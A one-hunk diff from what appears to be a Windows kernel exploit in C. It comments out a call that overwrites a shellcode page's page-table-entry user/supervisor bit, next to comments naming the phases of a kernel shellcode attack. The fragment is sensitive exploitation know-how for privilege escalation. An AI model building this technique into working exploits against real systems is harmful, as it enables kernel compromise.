@@ -83,7 +83,7 @@ int main()
                 Phase 4: Overwrite current PTE U/S for shellcode page an S (Supervisor Kernel)
             */
             
-            OverridePTESuperVisorControlBits(shellcodePTEBitsPtr,PTEAddressPTR,driverHandle);
+            //OverridePTESuperVisorControlBits(shellcodePTEBitsPtr,PTEAddressPTR,driverHandle);
             /*
                 Phase 5: Shellcode
             */
